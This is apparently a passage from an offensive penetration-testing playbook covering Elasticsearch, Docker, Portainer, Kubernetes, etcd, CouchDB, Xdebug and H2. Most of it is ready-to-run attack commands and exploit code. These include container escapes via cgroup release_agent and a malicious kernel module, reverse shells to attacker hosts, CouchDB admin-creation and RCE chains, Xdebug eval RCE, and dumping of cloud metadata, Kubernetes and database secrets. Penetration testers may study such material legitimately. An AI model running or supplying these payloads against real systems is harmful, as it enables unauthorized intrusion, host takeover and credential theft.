
### Common CVEs

| CVE | Component | Affected | Notes |
|-----|-----------|----------|-------|
| CVE-2014-3120 | ES core | < 1.2 | Groovy dynamic script RCE |
| CVE-2015-1427 | ES core | 1.3.0–1.4.2 | Groovy sandbox bypass |
| CVE-2015-3337 | ES site plugins | < 1.4.5 / 1.5.2 | Path traversal |
| CVE-2015-5531 | ES snapshot | < 1.6.1 | Path traversal via repo |
| CVE-2018-17246 | Kibana Timelion | < 5.6.13 / 6.4.3 | LFI → RCE |
| CVE-2019-7609 | Kibana | < 5.6.15 / 6.6.1 | Timelion proto-pollution RCE |
| CVE-2019-7608 | Kibana | < 5.6.15 / 6.6.1 | Console SSRF |

### Post-Exploit

```bash
# ES typically runs as `elasticsearch` user
cat /etc/elasticsearch/elasticsearch.yml
cat /etc/elasticsearch/users                                            # X-Pack file realm
cat /etc/elasticsearch/users_roles
cat /etc/elasticsearch/elasticsearch.keystore                           # encrypted secrets
ls /etc/elasticsearch/certs/                                            # TLS keys

# Kibana
cat /etc/kibana/kibana.yml | grep -iE 'password|key|user'

# Snapshot/backup paths often have credentials in restored docs
find / -name '*.json' -path '*elasticsearch*' 2>/dev/null
```

---

## Phase 14i: Container & Orchestrator

### Docker Socket / Daemon

```bash
# Local Unix socket (most common breakout — when /var/run/docker.sock is mounted into pwned container)
ls -la /var/run/docker.sock
curl --unix-socket /var/run/docker.sock http://localhost/version
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
curl --unix-socket /var/run/docker.sock http://localhost/images/json
curl --unix-socket /var/run/docker.sock http://localhost/info

# Docker CLI via socket
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock images

# Spawn a privileged container that mounts host root → host shell
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host /bin/bash
# Equivalent via raw API
curl -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  http://localhost/containers/create
# Then start + attach the returned container ID

# Remote Docker daemon — TCP (CVE-style misconfig)
nmap -p 2375,2376 -sV <TARGET>
curl http://<TARGET>:2375/version                                       # 2375 = unauth (NEVER expose in prod)
curl http://<TARGET>:2375/containers/json
docker -H tcp://<TARGET>:2375 ps
docker -H tcp://<TARGET>:2375 run -v /:/host --rm -it alpine chroot /host sh
```

### Docker Registry

```bash
# Default port: 5000 (HTTP) — often unauth
curl -s http://<TARGET>:5000/v2/                                        # API root
curl -s http://<TARGET>:5000/v2/_catalog                                # all repos
curl -s http://<TARGET>:5000/v2/<REPO>/tags/list                        # tags
curl -s http://<TARGET>:5000/v2/<REPO>/manifests/<TAG>                  # manifest

# Pull image to inspect for secrets
docker pull <TARGET>:5000/<REPO>:<TAG>
docker save <TARGET>:5000/<REPO>:<TAG> -o image.tar
mkdir img && tar xf image.tar -C img/
for layer in img/*/layer.tar; do tar tf "$layer" 2>/dev/null | grep -iE 'config|env|secret|key|.git'; done
# Whaler / dive — dump layer history (often has ENV with secrets)
go install github.com/wagoodman/dive@latest
dive <TARGET>:5000/<REPO>:<TAG>
```

### Portainer (Docker management UI — port 9000)

```bash
# Discover Portainer — default web UI port 9000 (sometimes 9443 for TLS)
nmap -p 9000,9443 -sV <TARGET>
curl -s http://<TARGET>:9000/ | grep -iE 'portainer|ng-app="portainer"'
# Title 'Portainer' + ng-app='portainer' in HTML confirms the panel
curl -s http://<TARGET>:9000/api/system/status                          # version banner (newer)
curl -s http://<TARGET>:9000/api/status                                 # version banner (older)
```

#### Unauth Admin Init Race — `/api/users/admin/init`

> **OPSEC:** Posting to `admin/init` claims the admin slot — the legitimate admin is now locked out of first-install. This is destructive to availability of the management UI; coordinate scope and cleanup with the engagement.

```bash
# Fresh installs prompt the first browser visitor to set the admin password.
# If no admin has been claimed yet, /api/users/admin/init accepts unauth POST.
# https://github.com/portainer/portainer/issues/428

# Portainer 2.x (capitalized field names)
curl -s -X POST -H 'Content-Type: application/json' \
  http://<TARGET>:9000/api/users/admin/init \
  -d '{"Username":"admin","Password":"<PASSWORD>"}'

# Portainer 1.x (lowercase 'password', username defaults to 'admin')
curl -s -X POST -H 'Content-Type: application/json' \
  http://<TARGET>:9000/api/users/admin/init \
  -d '{"password":"<PASSWORD>"}'

# Authenticate to obtain JWT
curl -s -X POST -H 'Content-Type: application/json' \
  http://<TARGET>:9000/api/auth \
  -d '{"Username":"admin","Password":"<PASSWORD>"}'
# -> {"jwt":"<TOKEN>"}

export JWT=<TOKEN>
```

#### Endpoint Enumeration — Docker daemons Portainer manages

```bash
# List endpoints (each = a Docker/Swarm/k8s environment Portainer fronts)
curl -s -H "Authorization: Bearer $JWT" http://<TARGET>:9000/api/endpoints | jq

# Inventory images on endpoint 1
curl -s -H "Authorization: Bearer $JWT" \
  http://<TARGET>:9000/api/endpoints/1/docker/images/json | jq '.[].RepoTags'

# Inventory running containers
curl -s -H "Authorization: Bearer $JWT" \
  http://<TARGET>:9000/api/endpoints/1/docker/containers/json | jq

# Inventory volumes / networks
curl -s -H "Authorization: Bearer $JWT" \
  http://<TARGET>:9000/api/endpoints/1/docker/volumes | jq
```

#### Host Escape — Privileged container via API (no browser)

```bash
# Pick an existing image (avoid pulling from the internet during an engagement)
IMG=$(curl -s -H "Authorization: Bearer $JWT" \
  http://<TARGET>:9000/api/endpoints/1/docker/images/json | jq -r '.[0].Id')

# Create privileged container with host root mounted
curl -s -X POST -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
  "http://<TARGET>:9000/api/endpoints/1/docker/containers/create?name=pt-pwn" \
  -d "{\"Image\":\"$IMG\",\"Cmd\":[\"/bin/sh\"],\"OpenStdin\":true,\"Tty\":true,\"HostConfig\":{\"Binds\":[\"/:/host\"],\"Privileged\":true}}"
# -> {"Id":"<CID>"}

CID=<CID>
curl -s -X POST -H "Authorization: Bearer $JWT" \
  "http://<TARGET>:9000/api/endpoints/1/docker/containers/$CID/start"

# Exec chroot into host filesystem — proof of host root
curl -s -X POST -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
  "http://<TARGET>:9000/api/endpoints/1/docker/containers/$CID/exec" \
  -d '{"AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["chroot","/host","/bin/sh","-c","id; hostname; head -1 /etc/shadow"]}'
# -> {"Id":"<EID>"}

curl -s -X POST -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
  "http://<TARGET>:9000/api/endpoints/1/docker/exec/<EID>/start" \
  -d '{"Detach":false,"Tty":true}'
```

#### Browser flow (post-auth GUI alternative)

```text
# 1. Containers -> Add container
# 2. Image: <small-image-from-list>  (alpine:latest, python:2.7-alpine)
# 3. Volumes tab -> bind mount  host /  ->  container /mnt
# 4. Runtime & Resources / Security/Host -> enable Privileged mode
# 5. Console tab -> /bin/sh -> chroot /mnt /bin/bash -> host root
```

> **Tip:** Recent browsers add `Connection: close` which breaks Portainer 1.x WebSocket exec — drive the API directly with curl (above), or rewrite the header via Burp Match-and-Replace.

#### Common CVEs

| CVE | Affected | Notes |
|-----|----------|-------|
| Pre-claim race | Portainer 1.x / 2.x fresh install | `/api/users/admin/init` accepts unauth POST until first admin set |
| CVE-2018-19466 | Portainer < 1.19.2 | Auth bypass via crafted POST |
| CVE-2020-24263 / 24264 | Portainer < 1.24.2 | LDAP credential disclosure / SSRF |
| CVE-2022-1530 | Portainer 2.13.x | Auth bypass via `/api/users/<id>` |

### Kubernetes API Server

```bash
# Default ports: 6443 (HTTPS, kube-apiserver), 8080 (HTTP, legacy/insecure-port)
nmap -p 6443,8080,10250,10255,10256,2379,2380 -sV <TARGET>

# Anonymous probe
curl -k https://<TARGET>:6443/version
curl -k https://<TARGET>:6443/api/v1/namespaces
curl -k https://<TARGET>:6443/apis
curl http://<TARGET>:8080/api/v1/pods                                   # legacy insecure-port

# Try with kubectl
kubectl --server=https://<TARGET>:6443 --insecure-skip-tls-verify get pods --all-namespaces
kubectl --server=https://<TARGET>:6443 --insecure-skip-tls-verify get secrets --all-namespaces
kubectl --server=https://<TARGET>:6443 --insecure-skip-tls-verify get nodes
kubectl --server=https://<TARGET>:6443 --insecure-skip-tls-verify auth can-i --list
kubectl --server=https://<TARGET>:6443 --insecure-skip-tls-verify auth can-i '*' '*'

# Service account token from inside a pod
ls /var/run/secrets/kubernetes.io/serviceaccount/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER=https://kubernetes.default.svc

curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NS/pods
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/secrets

# RBAC enumeration with bound token
kubectl --token=$TOKEN --certificate-authority=$CACERT --server=$APISERVER auth can-i --list
kubectl --token=$TOKEN --certificate-authority=$CACERT --server=$APISERVER auth can-i create pods
kubectl --token=$TOKEN --certificate-authority=$CACERT --server=$APISERVER get rolebindings --all-namespaces
kubectl --token=$TOKEN --certificate-authority=$CACERT --server=$APISERVER get clusterrolebindings
```

### kubelet API (port 10250 / 10255)

```bash
# 10250 — authenticated kubelet API (often has anonymous-auth=true misconfig)
# 10255 — read-only kubelet API (deprecated; sometimes still open)

# Probe
curl -sk https://<TARGET>:10250/pods                                    # list pods
curl -s http://<TARGET>:10255/pods                                      # read-only
curl -sk https://<TARGET>:10250/metrics
curl -sk https://<TARGET>:10250/runningpods
curl -sk https://<TARGET>:10250/healthz
curl -sk https://<TARGET>:10250/stats/summary

# Exec into a container via kubelet (CVE-style misconfig)
curl -sk -X POST "https://<TARGET>:10250/run/<NAMESPACE>/<POD>/<CONTAINER>" \
  -d "cmd=id"
curl -sk -X POST "https://<TARGET>:10250/run/default/mypod/mycontainer" \
  -d "cmd=cat /etc/shadow"

# Tools
git clone https://github.com/cyberark/kubeletctl
kubeletctl pods --server <TARGET>
kubeletctl exec "id" --server <TARGET> -p <POD> -c <CONTAINER>
kubeletctl scan rce --cidr <TARGET>/24
```

### etcd (port 2379)

```bash
# etcd holds entire k8s cluster state including all Secrets
nmap -p 2379,2380 -sV <TARGET>
curl -sk https://<TARGET>:2379/version
curl -sk https://<TARGET>:2379/v2/keys/?recursive=true                  # legacy v2 API

# v3 API via etcdctl
ETCDCTL_API=3 etcdctl --endpoints=https://<TARGET>:2379 --insecure-skip-tls-verify endpoint health
ETCDCTL_API=3 etcdctl --endpoints=https://<TARGET>:2379 --insecure-skip-tls-verify get / --prefix --keys-only
ETCDCTL_API=3 etcdctl --endpoints=https://<TARGET>:2379 --insecure-skip-tls-verify get /registry/secrets/ --prefix
ETCDCTL_API=3 etcdctl --endpoints=https://<TARGET>:2379 --insecure-skip-tls-verify get /registry/secrets/default/<SECRET> -w json

# Decode secret values
ETCDCTL_API=3 etcdctl --endpoints=https://<TARGET>:2379 --insecure-skip-tls-verify get /registry/secrets/ --prefix \
  | strings | grep -E 'password|token|key' -A1
```

### Kubernetes Dashboard

```bash
# Default port: 8001 (proxy) or NodePort
curl -sk https://<TARGET>:8001/api/v1/namespaces
curl -sk "https://<TARGET>/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/"

# If anon-bound to cluster-admin (classic misconfig pre-1.7), token auth bypass via "Skip"
# Browse: https://<TARGET>/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/#/secret?namespace=_all
```

### Container Escape — Privileged + cgroup release_agent

```bash
# Inside a privileged container, escape via cgroup release_agent trick
# Test: am I in a container? Am I privileged?
cat /proc/self/status | grep -i Cap                                     # CapEff: 0000003fffffffff = full caps
capsh --print
ls /dev | grep -E '^sd|^nvme|^vd'                                       # host block devices visible?
mount | grep cgroup

# Classic release_agent escape (cgroupv1)
mkdir /tmp/cg
mount -t cgroup -o rdma cgroup /tmp/cg
mkdir /tmp/cg/x
echo 1 > /tmp/cg/x/notify_on_release
HOSTPATH=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
echo "$HOSTPATH/cmd" > /tmp/cg/release_agent
cat > /cmd <<'EOF'
#!/bin/sh
ps -ef > /tmp/host_ps.txt
id > /tmp/host_id.txt
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
EOF
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cg/x/cgroup.procs"
# Output appears in container's filesystem as written by the host kernel
cat /tmp/host_ps.txt /tmp/host_id.txt
```

### Container Escape — Capability Abuse (CAP_SYS_ADMIN, CAP_DAC_READ_SEARCH)

```bash
# CAP_SYS_ADMIN — mount host filesystem
capsh --print | grep cap_sys_admin
mkdir /tmp/host
mount /dev/sda1 /tmp/host                                               # if host disk visible
ls /tmp/host/etc/                                                       # full host fs

# CAP_DAC_READ_SEARCH — read any file on host (Shocker / open_by_handle_at)
# CVE-2014-3519 / capability-shocker
git clone https://github.com/gabrtv/shocker
gcc shocker.c -o shocker
./shocker /etc/shadow                                                   # reads host file by handle bruteforce

# CAP_SYS_PTRACE — attach to host processes (when host PID namespace shared)
ps -ef
gdb -p <HOST_PID>

# CAP_SYS_MODULE — load kernel module for host-level code execution
# Step 1: check kernel headers version on target
uname -r
ls /lib/modules/$(uname -r)/build/ 2>/dev/null

# Step 2: write the LKM source (call_usermodehelper runs as root on the HOST)
cat > /tmp/evil.c << 'EOF'
#include <linux/module.h>
#include <linux/kmod.h>
MODULE_LICENSE("GPL");
static int __init evil_init(void) {
    char *argv[] = {"/bin/sh", "-c", "bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1", NULL};
    char *envp[] = {"HOME=/root", "PATH=/usr/bin:/bin:/sbin", NULL};
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return 0;
}
static void __exit evil_exit(void) {}
module_init(evil_init);
module_exit(evil_exit);
EOF

# Step 3: write the Makefile
cat > /tmp/Makefile << 'EOF'
obj-m += evil.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=/tmp modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=/tmp clean
EOF

# Step 4: compile and load
cd /tmp && make 2>/dev/null
insmod /tmp/evil.ko
```

### Docker Toolbox / Boot2Docker — Container-to-Windows-Host Pivot

Docker Toolbox (legacy Windows 7/8/10 Home) runs containers inside a VirtualBox VM (`default`) running Boot2Docker (Tiny Core Linux). The VM has default SSH credentials and mounts `C:\Users` at `/c/Users`. If you escape into the Boot2Docker VM, you can read/write the Windows host filesystem.

```bash
# From inside a container on Docker Toolbox, identify the host gateway (VirtualBox NAT)
ip route | grep default    # typically 10.0.2.2 or 192.168.99.1

# SSH into the Boot2Docker VM with default creds
ssh docker@<GATEWAY_IP>    # password: tcuser
# Or from the container directly:
ssh docker@192.168.99.100  # default Docker Toolbox VM IP; password: tcuser

# Once inside Boot2Docker VM — access Windows host filesystem
ls /c/Users/
cat /c/Users/<WINDOWS_USER>/Desktop/flag.txt
cat /c/Users/<WINDOWS_USER>/.ssh/id_rsa

# Write to Windows host (e.g., startup folder for persistence demo)
echo "powershell -e <BASE64>" > "/c/Users/<WINDOWS_USER>/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/pwn.bat"
```

#### Living-off-the-land / LOTL variant

```bash
# Pure ssh (present in most container images or installable via apk/apt inside container)
# The entire chain uses only ssh + filesystem access — no external tools
ssh -o StrictHostKeyChecking=no docker@192.168.99.100 'cat /c/Users/*/Desktop/*.txt'
```

### Container Escape — Mounted /var/run/docker.sock

See "Docker Socket" above. If `/var/run/docker.sock` is bind-mounted into a container, escape is trivial:

```bash
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host /bin/bash
```

### Cloud Metadata Service Abuse (from inside pod)

```bash
# AWS IMDSv1 — credentials of node IAM role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
# → AccessKeyId, SecretAccessKey, Token

# IMDSv2
TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCE
curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### Common Tools

```bash
# Kubernetes recon + exploit suite
peirates                                                                 # interactive k8s post-ex
git clone https://github.com/inguardians/peirates

# kube-hunter
pip3 install kube-hunter
kube-hunter --remote <TARGET>
kube-hunter --cidr <TARGET>/24

# kubeaudit / kubescape (defense-side, useful for finding what to attack)
kubeaudit all
kubescape scan

# CDK (Container DevOps Kit) — escape automation
git clone https://github.com/cdk-team/CDK
./cdk evaluate
./cdk run mount-docker-sock
./cdk run cap-dac-read-search
```

### Common CVEs

| CVE | Affected | Notes |
|-----|----------|-------|
| CVE-2019-5736 | runc < 1.0-rc6 | Container → host via /proc/self/exe overwrite |
| CVE-2022-0185 | Linux 5.1–5.16.2 | fs context heap overflow → container escape (CAP_SYS_ADMIN) |
| CVE-2022-0492 | Linux pre-5.17 | cgroupv1 release_agent unprivileged escape |
| CVE-2024-21626 | runc 1.0.0-rc93 → 1.1.11 | leaky FD → host fs access |
| CVE-2018-1002105 | k8s 1.0–1.9, 1.10.x, 1.11.x, 1.12.x | API server proxy auth bypass → cluster admin |
| CVE-2020-8554 | k8s all | MITM via LoadBalancer ExternalIP |
| CVE-2018-1002100 | kubectl cp | Path traversal on copy out |

### Post-Exploit (Cluster-Wide Pivot)

```bash
# Once you have a service account with create-pod permission, deploy a privileged escape pod
kubectl --token=$TOKEN run pwn --image=alpine --restart=Never --overrides='{
  "spec": {
    "hostPID": true,
    "containers": [{
      "name": "pwn",
      "image": "alpine",
      "stdin": true,
      "tty": true,
      "command": ["/bin/sh"],
      "securityContext": {"privileged": true},
      "volumeMounts": [{"name":"host","mountPath":"/host"}]
    }],
    "volumes": [{"name":"host","hostPath":{"path":"/"}}]
  }
}' -ti

# Once on a node, grab kubelet client cert (cluster-admin equivalent on most setups)
cat /var/lib/kubelet/kubeconfig
cat /etc/kubernetes/admin.conf
ls /etc/kubernetes/pki/

# Dump all secrets
kubectl get secrets --all-namespaces -o json | jq '.items[] | {name:.metadata.name, ns:.metadata.namespace, data:.data}'
# Decode
kubectl get secret <NAME> -n <NAMESPACE> -o jsonpath='{.data.password}' | base64 -d
```

---

## Phase 14j: Apache CouchDB

### Enumeration

```bash
# Default port: 5984 (HTTP REST), 6984 (HTTPS), 4369 (epmd), 9100-9200 (Erlang dist)
curl -s http://<TARGET>:5984/                                  # banner — {"couchdb":"Welcome","version":"X.Y.Z",...}
curl -s http://<TARGET>:5984/_all_dbs                          # list databases (often unauth in admin party mode)
curl -s http://<TARGET>:5984/_membership                       # cluster nodes
curl -s http://<TARGET>:5984/_active_tasks
curl -s http://<TARGET>:5984/_node/_local/_config              # leaks config (auth required normally)
curl -s http://<TARGET>:5984/_utils/                           # Fauxton web UI

# Per-database enumeration
curl -s http://<TARGET>:5984/<DB_NAME>                         # db metadata + doc_count
curl -s http://<TARGET>:5984/<DB_NAME>/_all_docs               # list doc IDs
curl -s "http://<TARGET>:5984/<DB_NAME>/_all_docs?include_docs=true" | jq
curl -s http://<TARGET>:5984/<DB_NAME>/<DOC_ID>                # specific doc

# nmap
nmap -p 5984,6984 --script couchdb-databases,couchdb-stats <TARGET>
```

### Version Mapping

```text
< 1.7.0   → CVE-2017-12635 + CVE-2017-12636 vulnerable
< 2.1.0   → CVE-2017-12635 + CVE-2017-12636 vulnerable
2.x admin party (no admin set)   → all endpoints unauth
3.x       → admin must be set on first start; query_server requires admin
```

### Default / Admin Party

```text
admin:admin
admin:password
admin:couchdb
root:root
# "Admin party" = no admin defined → every request is _admin
```

### CVE-2017-12636 — Unauth Admin Creation (Duplicate JSON Keys)

> **Bug:** Erlang JSON parser keeps the FIRST occurrence of a duplicate key (`["_admin"]`); JS validator checks the SECOND (`[]`) and lets it through. Result: unauth admin user.
> Reference: https://justi.cz/security/2017/11/14/couchdb-rce-npm.html

```bash
# Create admin user with duplicate 'roles' key
curl -s -X PUT "http://<TARGET>:5984/_users/org.couchdb.user:<USERNAME>" \
  -H "Accept: application/json" -H "Content-Type: application/json" \
  --data-binary '{
    "type": "user",
    "name": "<USERNAME>",
    "roles": ["_admin"],
    "roles": [],
    "password": "<PASSWORD>"
  }'
# Response: {"ok":true,"id":"org.couchdb.user:<USERNAME>","rev":"..."}

# Verify admin
curl -s http://<USERNAME>:<PASSWORD>@<TARGET>:5984/_membership
curl -s http://<USERNAME>:<PASSWORD>@<TARGET>:5984/_node/_local/_config | jq
```

### CVE-2017-12635 — RCE via query_server (Admin Required)

Chains with CVE-2017-12636. Admin sets arbitrary command as a query_server, then triggers via temp view.

```bash
# 1. Set query_server to reverse shell (CouchDB 2.x — node name is couchdb@localhost or couchdb@<host>)
curl -s -X PUT "http://<USERNAME>:<PASSWORD>@<TARGET>:5984/_node/couchdb@localhost/_config/query_servers/cmd" \
  -H "Content-Type: application/json" \
  -d '"/bin/bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1\""'

# Confirm node name first if @localhost fails:
curl -s http://<USERNAME>:<PASSWORD>@<TARGET>:5984/_membership | jq

# 2. Create db + doc to satisfy temp_view input
curl -X PUT "http://<USERNAME>:<PASSWORD>@<TARGET>:5984/pwn"
curl -X PUT "http://<USERNAME>:<PASSWORD>@<TARGET>:5984/pwn/test" -d '{"_id":"test"}'

# 3. Trigger query_server → RCE as couchdb user (start nc -lvnp <ATTACKER_PORT> first)
curl -X POST "http://<USERNAME>:<PASSWORD>@<TARGET>:5984/pwn/_temp_view?limit=10" \
  -H "Content-Type: application/json" -d '{"language":"cmd","map":""}'
```

### CouchDB 1.x — query_server Path Differs

```bash
# 1.x uses /_config/ (no _node/ prefix)
curl -s -X PUT "http://<USERNAME>:<PASSWORD>@<TARGET>:5984/_config/query_servers/cmd" \
  -H "Content-Type: application/json" \
  -d '"/bin/bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1\""'
```

### CVE-2022-24706 — Erlang Cookie Default

```bash
# CouchDB 3.x default Erlang cookie 'monster' allows RCE via Erlang distribution protocol
nmap -p 4369,9100-9200 <TARGET>                      # epmd + Erlang dist nodes
# Exploit: erl -setcookie monster -name attacker@<ATTACKER_IP> -remsh couchdb@<TARGET>
```

### Metasploit

```bash
msfconsole -q -x "use exploit/linux/http/apache_couchdb_cmd_exec; \
  set RHOSTS <TARGET>; set RPORT 5984; \
  set LHOST <ATTACKER_IP>; set LPORT <ATTACKER_PORT>; run"

# Auxiliary modules
# auxiliary/scanner/couchdb/couchdb_enum
# auxiliary/scanner/couchdb/couchdb_login
```

### Common CVEs

```text
CVE-2017-12635   Unauth admin creation via duplicate JSON keys (< 2.1.0)
CVE-2017-12636   Privileged RCE via query_server config (< 2.1.0, chains with -12635)
CVE-2018-8007   Local privesc via local.ini (admin → couchdb user)
CVE-2021-38295  Database admin can replicate to _users with _admin role escalation
CVE-2022-24706  Erlang cookie default → remote code execution via Erlang dist (port 4369/9100+)
CVE-2023-26268  Privilege escalation via _replicator
```

### Post-Exploit

**Credential Harvest:**

```bash
# Dump _users (password hashes — bcrypt, salt, derived_key/iterations for PBKDF2)
curl -s "http://<USERNAME>:<PASSWORD>@<TARGET>:5984/_users/_all_docs?include_docs=true" | jq

# Dump every database for plaintext creds
for db in $(curl -s http://<USERNAME>:<PASSWORD>@<TARGET>:5984/_all_dbs | jq -r '.[]'); do
  echo "[+] Dumping $db"
  curl -s "http://<USERNAME>:<PASSWORD>@<TARGET>:5984/${db}/_all_docs?include_docs=true" > "${db}.json"
done

# Search for sensitive fields
grep -Ei "password|secret|token|api[_-]?key|ssh" *.json
```

**Filesystem Map:**

```bash
# Linux defaults
/opt/couchdb/                                        # install root (3.x)
/opt/couchdb/etc/local.ini                           # admin hashes, auth config
/opt/couchdb/etc/vm.args                             # Erlang cookie
/var/lib/couchdb/                                    # database files (.couch)
/var/log/couchdb/

# Service runs as 'couchdb' user — pivot via SSH key reuse, sudo -l, /home enumeration
id; cat /etc/passwd | grep couchdb
find / -name "local.ini" 2>/dev/null
```

---

## Phase 14k: Xdebug Debugger — Pre-Auth RCE

Xdebug ≤ 2.5.5 with `xdebug.remote_connect_back=1` (or 3.x with reachable `xdebug.client_host`) lets an unauthenticated attacker trigger a DBGp callback from the PHP process, then send an `eval` packet for arbitrary PHP code execution as the web user.

### 14k.1 Detection

```bash
# Banner check — Xdebug usually advertises in headers / phpinfo
curl -sI http://<TARGET>/ | grep -iE 'xdebug|x-powered-by'
curl -s http://<TARGET>/phpinfo.php | grep -iE 'xdebug|remote_connect_back|client_host'

# Common phpinfo paths
for p in /phpinfo.php /info.php /test.php /pinfo.php /xdebug.php; do
  curl -s -o /dev/null -w "%{http_code} $p\n" http://<TARGET>$p
done

# nmap NSE — TCP 9000 dbgp listener fingerprint (when reachable from target)
nmap -sV -p 9000 --script=banner <TARGET>
```

> **Tip:** Vulnerable indicators in phpinfo: `xdebug.remote_enable=On`, `xdebug.remote_connect_back=On` (2.x) or `xdebug.start_with_request=trigger`, `xdebug.mode=debug` (3.x). If `remote_connect_back=On`, ANY source IP that hits the app gets a callback — the bug is pre-auth.

### 14k.2 Exploitation — vulhub PoC (Xdebug 2.x)

```bash
# https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce
# Listener for the reverse shell
nc -lvnp <ATTACKER_PORT>

# PoC listens on local TCP 9000 for the dbgp callback, then sends eval()
python3 exp.py -t http://<TARGET>/<APP_PATH> \
  -c 'exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <ATTACKER_PORT> >/tmp/f");'

# Single-shot bash variant (no PTY needed)
python3 exp.py -t http://<TARGET>/index.php \
  -c "exec('bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1\"');"
```

### 14k.3 Manual trigger (no PoC available)

```bash
# Step 1: dbgp listener on attacker (Komodo / dbgp-proxy / vulhub exp.py listener mode)
# Default dbgp port: TCP 9000
nc -lvnp 9000

# Step 2: Trigger connect-back via XDEBUG_SESSION_START GET param
# X-Forwarded-For abuses remote_connect_back when target trusts XFF
curl "http://<TARGET>/<APP_PATH>?XDEBUG_SESSION_START=phpstorm" \
  -H 'X-Forwarded-For: <ATTACKER_IP>'

# Step 3: When dbgp <init> arrives, send eval packet (length-prefixed, NUL-terminated)
# Format:  eval -i 1 -- <base64(php_code)>\0
# Example payload (base64 of: system('id');):
#   eval -i 1 -- c3lzdGVtKCdpZCcpOw==
```

### 14k.4 Xdebug 3.x variant

```bash
# 3.x dropped remote_connect_back but keeps the eval primitive when client_host
# is set to an attacker-reachable address (or when start_with_request=trigger
# and the trigger cookie/GET is supplied).

# Trigger forms:
curl "http://<TARGET>/<APP_PATH>?XDEBUG_TRIGGER=1"
curl "http://<TARGET>/<APP_PATH>" -H 'Cookie: XDEBUG_SESSION=phpstorm'

# If xdebug.client_host points at attacker (or a host the attacker controls
# via SSRF/DNS rebinding), same DBGp eval packet → RCE.
```

### 14k.5 Post-Exploit

```bash
# Web user context — typical: www-data / apache / nginx / nobody
id
hostname
cat /etc/passwd | head -5

# Loot
find /var/www -name '*.php' -exec grep -lE 'password|api_key|db_pass|DB_PASS' {} \;
cat /var/www/html/wp-config.php 2>/dev/null
cat /var/www/html/.env 2>/dev/null

# PrivEsc enum from web-user shell
sudo -l
find / -perm -4000 -type f 2>/dev/null
ss -tlnp 2>/dev/null
```

> **OPSEC:** dbgp callback on TCP 9000 is high-signal — Xdebug emits `Xdebug` log entries to `xdebug.log` and any reverse-proxy/EDR sees the outbound 9000 from PHP-FPM. Validate detection telemetry exists before/after firing in purple-team contexts.

---

## Phase 14l: H2 Database Console (Standalone)

> **Context:** H2 ships an embeddable web console (default `:8082`) with `sa`/blank as the default user. Connecting to a non-existent `jdbc:h2:~/<INTERNAL_DB>` URL silently CREATES that DB with `sa`/blank — auth bypass for free. From there `CREATE ALIAS` -> `Runtime.exec` is RCE on every shipped version.

### Enumeration

```bash
# Default ports: 8082 (HTTP console), 9092 (TCP server), 8083 (PG-compat)
nmap -p 8082,9092,8083 -sV --script http-title <TARGET>
curl -sI http://<TARGET>:8082/
curl -s http://<TARGET>:8082/ | grep -iE 'H2 Console|h2database'

# Post-foothold version / config check
ps -ef | grep -iE 'h2.*\.jar|org\.h2\.tools\.(Server|Console)'
# Cmdline flags -webAllowOthers / -tcpAllowOthers indicate remote-reachable
ss -lntp | grep -E ':(8082|9092|8083)\b'
```

### Pivot — Localhost-Only Console via SSH

```bash
# Default install binds 127.0.0.1 only; tunnel after foothold
ssh -L 127.0.0.1:9002:127.0.0.1:8082 <USER>@<PIVOT_HOST>
# Browse: http://127.0.0.1:9002/
```

### Auth Bypass — Default sa/blank + Auto-Create DB

```text
# At the H2 console login form, accept the default and create a fresh DB on the fly:
Driver Class: org.h2.Driver
JDBC URL:     jdbc:h2:~/<INTERNAL_DB>          # any name -> DB created with sa/blank
User Name:    sa
Password:     (blank)
# Alt URLs that also auto-create with sa/blank:
#   jdbc:h2:mem:<INTERNAL_DB>
